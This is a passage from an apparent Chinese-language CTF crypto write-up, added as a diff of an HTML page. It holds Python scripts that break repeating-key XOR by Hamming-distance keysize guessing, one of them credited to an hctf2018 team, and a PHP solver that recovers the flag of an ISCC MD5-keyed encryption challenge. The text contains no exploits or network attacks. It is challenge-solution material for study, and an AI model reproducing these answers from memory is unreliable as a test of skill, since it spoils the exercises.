+</span></span><span style="display:flex;"><span>		b<span style="color:#f92672">=</span>chr(ord(key[n])<span style="color:#f92672">^</span>ord(ch))
+</span></span><span style="display:flex;"><span>		str_result<span style="color:#f92672">+=</span>b
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> str_result
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#获得概率分数</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_score</span>(string):
+</span></span><span style="display:flex;"><span>	score<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> string:
+</span></span><span style="display:flex;"><span>		char<span style="color:#f92672">=</span>char<span style="color:#f92672">.</span>lower()
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> char <span style="color:#f92672">in</span> CHARACTER_FREQ:
+</span></span><span style="display:flex;"><span>			score<span style="color:#f92672">+=</span>CHARACTER_FREQ[char]
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> score
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#将hex的每个字符与备选密钥进行xor</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">single_xor</span>(candidate_key,hex_string):
+</span></span><span style="display:flex;"><span>	result<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> hex_string:
+</span></span><span style="display:flex;"><span>		b<span style="color:#f92672">=</span>chr(candidate_key<span style="color:#f92672">^</span>ord(i))
+</span></span><span style="display:flex;"><span>		result<span style="color:#f92672">+=</span>b
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> result
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#遍历备选密钥</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">Traversal_singlechar</span>(hex_string):
+</span></span><span style="display:flex;"><span>	candidate<span style="color:#f92672">=</span>[]
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> candidate_key <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):
+</span></span><span style="display:flex;"><span>		plaintext<span style="color:#f92672">=</span>single_xor(candidate_key,hex_string)
+</span></span><span style="display:flex;"><span>		score<span style="color:#f92672">=</span>get_score(plaintext)
+</span></span><span style="display:flex;"><span>		result<span style="color:#f92672">=</span>{
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#39;score&#39;</span>:score,
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#39;plaintext&#39;</span>:plaintext,
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#39;key&#39;</span>:candidate_key
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		candidate<span style="color:#f92672">.</span>append(result)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> sorted(candidate,key<span style="color:#f92672">=</span><span style="color:#66d9ef">lambda</span> c:c[<span style="color:#e6db74">&#39;score&#39;</span>])[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">hamming_distance</span>(a_str,b_str):
+</span></span><span style="display:flex;"><span>	dist<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> x,y <span style="color:#f92672">in</span> zip(a_str,b_str):
+</span></span><span style="display:flex;"><span>		b<span style="color:#f92672">=</span>bin(ord(x)<span style="color:#f92672">^</span>ord(y)) <span style="color:#75715e">#转换为二进制（以字符串形式表示，如“0b100000”，0b表示二进制）</span>
+</span></span><span style="display:flex;"><span>		dist<span style="color:#f92672">+=</span>b<span style="color:#f92672">.</span>count(<span style="color:#e6db74">&#39;1&#39;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> dist
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">guess_keysize</span>(string):
+</span></span><span style="display:flex;"><span>	normals<span style="color:#f92672">=</span>[]
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> keysize <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">40</span>):
+</span></span><span style="display:flex;"><span>		blocks<span style="color:#f92672">=</span>[]
+</span></span><span style="display:flex;"><span>		cnt<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>		distance<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">#根据建议获得四个block，将这四个block两两得到hamming_distance。</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,len(string),keysize):
+</span></span><span style="display:flex;"><span>			cnt<span style="color:#f92672">+=</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>			blocks<span style="color:#f92672">.</span>append(string[i:i<span style="color:#f92672">+</span>keysize])
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> cnt<span style="color:#f92672">==</span><span style="color:#ae81ff">4</span>:
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>		pairs<span style="color:#f92672">=</span>itertools<span style="color:#f92672">.</span>combinations(blocks,<span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> (x,y) <span style="color:#f92672">in</span> pairs:
+</span></span><span style="display:flex;"><span>			distance<span style="color:#f92672">+=</span>hamming_distance(x,y)
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">#平均一下</span>
+</span></span><span style="display:flex;"><span>		distance<span style="color:#f92672">=</span>distance<span style="color:#f92672">/</span>(<span style="color:#ae81ff">6.0</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">#Normalize this result by dividing by KEYSIZE.</span>
+</span></span><span style="display:flex;"><span>		normal_distance<span style="color:#f92672">=</span>distance<span style="color:#f92672">/</span>keysize
+</span></span><span style="display:flex;"><span>		key<span style="color:#f92672">=</span>{
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#39;keysize&#39;</span>:keysize,
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#39;distance&#39;</span>:normal_distance
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		normals<span style="color:#f92672">.</span>append(key)
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">#print key</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">#选3个最小的为待选的keysize</span>
+</span></span><span style="display:flex;"><span>	candidate_keysize<span style="color:#f92672">=</span>sorted(normals,key<span style="color:#f92672">=</span><span style="color:#66d9ef">lambda</span> c:c[<span style="color:#e6db74">&#39;distance&#39;</span>])[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">3</span>]
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> candidate_keysize
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">guess_key</span>(keysize,string):
+</span></span><span style="display:flex;"><span>	now_str<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>	key<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(keysize):
+</span></span><span style="display:flex;"><span>		now_str<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> index,ch <span style="color:#f92672">in</span> enumerate(string):
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> index<span style="color:#f92672">%</span>keysize<span style="color:#f92672">==</span>i:
+</span></span><span style="display:flex;"><span>				now_str<span style="color:#f92672">+=</span>ch
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">#获得key的第i位的值,转换为字符</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">#print now_str</span>
+</span></span><span style="display:flex;"><span>		key<span style="color:#f92672">+=</span>chr(Traversal_singlechar(now_str)[<span style="color:#e6db74">&#39;key&#39;</span>])
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> key
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_plaint</span>(string):
+</span></span><span style="display:flex;"><span>	keysize_list<span style="color:#f92672">=</span>guess_keysize(string)
+</span></span><span style="display:flex;"><span>	candidate_key<span style="color:#f92672">=</span>[]
+</span></span><span style="display:flex;"><span>	possible_plaints<span style="color:#f92672">=</span>[]
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> keysize <span style="color:#f92672">in</span> keysize_list:
+</span></span><span style="display:flex;"><span>		key<span style="color:#f92672">=</span>guess_key(keysize[<span style="color:#e6db74">&#39;keysize&#39;</span>],string)
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">#print key</span>
+</span></span><span style="display:flex;"><span>		possible_plaints<span style="color:#f92672">.</span>append((xor_repeat_key(key,string),key))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	for i in possible_plaints:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">		print i[1]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">		print get_score(i[0].decode(&#39;hex&#39;))
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">		print len(i[0])
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">		print i[0].decode(&#39;hex&#39;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> sorted(possible_plaints,key<span style="color:#f92672">=</span><span style="color:#66d9ef">lambda</span> c:get_score(c[<span style="color:#ae81ff">0</span>]))[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">assert</span> hamming_distance(<span style="color:#e6db74">&#39;this is a test&#39;</span>, <span style="color:#e6db74">&#39;wokka wokka!!!&#39;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">37</span>
+</span></span><span style="display:flex;"><span>	contents<span style="color:#f92672">=</span>open(<span style="color:#e6db74">&#39;6.txt&#39;</span>)<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">#base64解码</span>
+</span></span><span style="display:flex;"><span>	string<span style="color:#f92672">=</span>str(contents)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;base64&#39;</span>)
+</span></span><span style="display:flex;"><span>	result<span style="color:#f92672">=</span>get_plaint(string)
+</span></span><span style="display:flex;"><span>	print result[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>	print result[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>	main()
+</span></span></code></pre></div><p>6.txt中的内容是去盐分之后的密文base64之后的内容。</p>
+<p>再附上hctf2018中天枢的脚本</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> string
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">bxor</span>(a, b):     <span style="color:#75715e"># xor two byte strings of different lengths</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> len(a) <span style="color:#f92672">&gt;</span> len(b):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> bytes([x <span style="color:#f92672">^</span> y <span style="color:#66d9ef">for</span> x, y <span style="color:#f92672">in</span> zip(a[:len(b)], b)])
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> bytes([x <span style="color:#f92672">^</span> y <span style="color:#66d9ef">for</span> x, y <span style="color:#f92672">in</span> zip(a, b[:len(a)])])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">hamming_distance</span>(b1, b2):
+</span></span><span style="display:flex;"><span>    differing_bits <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> byte <span style="color:#f92672">in</span> bxor(b1, b2):
+</span></span><span style="display:flex;"><span>        differing_bits <span style="color:#f92672">+=</span> bin(byte)<span style="color:#f92672">.</span>count(<span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> differing_bits
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">break_single_key_xor</span>(text):
+</span></span><span style="display:flex;"><span>    key <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    possible_space<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    max_possible<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    letters <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>ascii_letters<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;ascii&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> a <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(text)):
+</span></span><span style="display:flex;"><span>        maxpossible <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> b <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(text)):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(a <span style="color:#f92672">==</span> b):
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>            c <span style="color:#f92672">=</span> text[a] <span style="color:#f92672">^</span> text[b]
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> c <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> letters <span style="color:#f92672">and</span> c <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>            maxpossible <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> maxpossible<span style="color:#f92672">&gt;</span>max_possible:
+</span></span><span style="display:flex;"><span>            max_possible<span style="color:#f92672">=</span>maxpossible
+</span></span><span style="display:flex;"><span>            possible_space<span style="color:#f92672">=</span>a
+</span></span><span style="display:flex;"><span>    key <span style="color:#f92672">=</span> text[possible_space]<span style="color:#f92672">^</span> <span style="color:#ae81ff">0x20</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> chr(key)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>text <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;6.txt&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> f:
+</span></span><span style="display:flex;"><span>        text <span style="color:#f92672">+=</span> line
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#  b = base64.b64decode(text)</span>
+</span></span><span style="display:flex;"><span>    b <span style="color:#f92672">=</span> text
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>normalized_distances <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> KEYSIZE <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">40</span>):
+</span></span><span style="display:flex;"><span>    b1 <span style="color:#f92672">=</span> b[: KEYSIZE]
+</span></span><span style="display:flex;"><span>    b2 <span style="color:#f92672">=</span> b[KEYSIZE: KEYSIZE <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>]
+</span></span><span style="display:flex;"><span>    b3 <span style="color:#f92672">=</span> b[KEYSIZE <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>: KEYSIZE <span style="color:#f92672">*</span> <span style="color:#ae81ff">3</span>]
+</span></span><span style="display:flex;"><span>    b4 <span style="color:#f92672">=</span> b[KEYSIZE <span style="color:#f92672">*</span> <span style="color:#ae81ff">3</span>: KEYSIZE <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>]
+</span></span><span style="display:flex;"><span>    b5 <span style="color:#f92672">=</span> b[KEYSIZE <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>: KEYSIZE <span style="color:#f92672">*</span> <span style="color:#ae81ff">5</span>]
+</span></span><span style="display:flex;"><span>    b6 <span style="color:#f92672">=</span> b[KEYSIZE <span style="color:#f92672">*</span> <span style="color:#ae81ff">5</span>: KEYSIZE <span style="color:#f92672">*</span> <span style="color:#ae81ff">6</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    normalized_distance <span style="color:#f92672">=</span> float(
+</span></span><span style="display:flex;"><span>        hamming_distance(b1, b2) <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>        hamming_distance(b2, b3) <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>        hamming_distance(b3, b4) <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>        hamming_distance(b4, b5) <span style="color:#f92672">+</span> 
+</span></span><span style="display:flex;"><span>        hamming_distance(b5, b6) 
+</span></span><span style="display:flex;"><span>    ) <span style="color:#f92672">/</span> (KEYSIZE <span style="color:#f92672">*</span> <span style="color:#ae81ff">5</span>)
+</span></span><span style="display:flex;"><span>    normalized_distances<span style="color:#f92672">.</span>append(
+</span></span><span style="display:flex;"><span>        (KEYSIZE, normalized_distance)
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>normalized_distances <span style="color:#f92672">=</span> sorted(normalized_distances,key<span style="color:#f92672">=</span><span style="color:#66d9ef">lambda</span> x:x[<span style="color:#ae81ff">1</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> KEYSIZE,_ <span style="color:#f92672">in</span> normalized_distances[:<span style="color:#ae81ff">5</span>]:
+</span></span><span style="display:flex;"><span>    block_bytes <span style="color:#f92672">=</span> [[] <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(KEYSIZE)]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i, byte <span style="color:#f92672">in</span> enumerate(b):
+</span></span><span style="display:flex;"><span>        block_bytes[i <span style="color:#f92672">%</span> KEYSIZE]<span style="color:#f92672">.</span>append(byte)
+</span></span><span style="display:flex;"><span>    keys <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> bbytes <span style="color:#f92672">in</span> block_bytes:
+</span></span><span style="display:flex;"><span>            keys <span style="color:#f92672">+=</span> break_single_key_xor(bbytes)
+</span></span><span style="display:flex;"><span>        key <span style="color:#f92672">=</span> bytearray(keys <span style="color:#f92672">*</span> len(b), <span style="color:#e6db74">&#34;utf-8&#34;</span>)
+</span></span><span style="display:flex;"><span>        plaintext <span style="color:#f92672">=</span> bxor(b, key)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;keysize:&#34;</span>, KEYSIZE)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;key is:&#34;</span>, keys, <span style="color:#e6db74">&#34;n&#34;</span>)
+</span></span><span style="display:flex;"><span>        s <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>decode(plaintext)
+</span></span><span style="display:flex;"><span>        print(s)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">continue</span>
+</span></span></code></pre></div><h2 id="md5">MD5<a hidden class="anchor" aria-hidden="true" href="#md5">#</a></h2>
+<h3 id="php_encrypto_1">PHP_encrypto_1<a hidden class="anchor" aria-hidden="true" href="#php_encrypto_1">#</a></h3>
+<p>source code:::</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">encrypt</span>($data,$key)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    $key <span style="color:#f92672">=</span> <span style="color:#a6e22e">md5</span>(<span style="color:#e6db74">&#39;ISCC&#39;</span>);
+</span></span><span style="display:flex;"><span>    $x <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    $len <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>($data);
+</span></span><span style="display:flex;"><span>    $klen <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>($key);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ($i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> $len; $i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($x <span style="color:#f92672">==</span> $klen)
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            $x <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        $char <span style="color:#f92672">.=</span> $key[$x];
+</span></span><span style="display:flex;"><span>        $x<span style="color:#f92672">+=</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ($i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> $len; $i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        $str <span style="color:#f92672">.=</span> <span style="color:#a6e22e">chr</span>((<span style="color:#a6e22e">ord</span>($data[$i]) <span style="color:#f92672">+</span> <span style="color:#a6e22e">ord</span>($char[$i])) <span style="color:#f92672">%</span> <span style="color:#ae81ff">128</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">base64_encode</span>($str);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">//the result is fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=
+</span></span></span></code></pre></div><p>solving:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#&#39;ISCC&#39;md5之后的结果
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    $mkey <span style="color:#f92672">=</span><span style="color:#e6db74">&#39;729623334f0aa2784a1599fd374c120d&#39;</span>;
+</span></span><span style="display:flex;"><span>    $target<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=&#39;</span>;
+</span></span><span style="display:flex;"><span>    $target<span style="color:#f92672">=</span><span style="color:#a6e22e">base64_decode</span>($target);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    $target_ay<span style="color:#f92672">=</span><span style="color:#66d9ef">array</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ($i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;$i<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">strlen</span>($target);$i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">ord</span>($target[$i])<span style="color:#f92672">.</span><span style="color:#e6db74">&#39; &#39;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">array_push</span>($target_ay,<span style="color:#a6e22e">ord</span>($target[$i]));
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;||||||||&#34;</span>;
+</span></span><span style="display:flex;"><span>    $j<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    $realkey_ay<span style="color:#f92672">=</span><span style="color:#66d9ef">array</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ($i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;$i<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">strlen</span>($target);$i<span style="color:#f92672">++</span>){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($j<span style="color:#f92672">==</span><span style="color:#a6e22e">strlen</span>($mkey)){
+</span></span><span style="display:flex;"><span>            $j<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">ord</span>($mkey[$j])<span style="color:#f92672">.</span><span style="color:#e6db74">&#39; &#39;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">array_push</span>($realkey_ay,<span style="color:#a6e22e">ord</span>($mkey[$j]));
+</span></span><span style="display:flex;"><span>        $j<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    $flag1<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span>    $flag2<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">foreach</span>($target_ay <span style="color:#66d9ef">as</span> $key<span style="color:#f92672">=&gt;</span>$value){
+</span></span><span style="display:flex;"><span>        $i<span style="color:#f92672">=</span>$key;
+</span></span><span style="display:flex;"><span>        $dd<span style="color:#f92672">=</span>$value;
+</span></span><span style="display:flex;"><span>        $od<span style="color:#f92672">=</span>$realkey_ay[$i];
+</span></span><span style="display:flex;"><span>        $flag1<span style="color:#f92672">.=</span><span style="color:#a6e22e">chr</span>($dd<span style="color:#f92672">+</span><span style="color:#ae81ff">128</span><span style="color:#f92672">-</span>$od);
+</span></span><span style="display:flex;"><span>        $flag2<span style="color:#f92672">.=</span><span style="color:#a6e22e">chr</span>($dd<span style="color:#f92672">-</span>$od);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> $flag1;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> $flag2;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><h2 id="other">other<a hidden class="anchor" aria-hidden="true" href="#other">#</a></h2>
